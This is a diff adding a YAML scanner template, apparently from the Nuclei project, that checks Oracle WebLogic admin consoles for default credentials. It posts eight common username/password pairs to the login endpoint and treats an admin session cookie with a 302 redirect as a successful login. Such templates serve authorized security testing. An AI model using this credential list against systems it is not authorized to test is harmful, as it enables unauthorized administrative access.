@@ -1,0 +1,59 @@
+id: weblogic-manage-login
+
+info:
+  name: WebLogic weak login
+  author: pdteam
+  severity: high
+  tags: weblogic-console
+
+requests:
+  - raw:
+      - |
+        POST /console/j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/console/login/LoginForm.jsp
+
+        j_username={{username}}&j_password={{password}}&j_character_encoding=UTF-8
+    attack: pitchfork
+    payloads:
+      username:
+        - weblogic
+        - weblogic
+        - weblogic
+        - weblogic
+        - weblogic
+        - admin
+        - admin
+        - system
+
+      password:
+        - weblogic
+        - weblogic1
+        - welcome1
+        - Oracle@123
+        - weblogic123
+        - 12345678
+        - security
+        - password
+
+    stop-at-first-match: true
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "ADMINCONSOLESESSION"
+        condition: and
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          -  LoginForm.jsp
+        condition: and
+
+      - type: status
+        status:
+          - 302
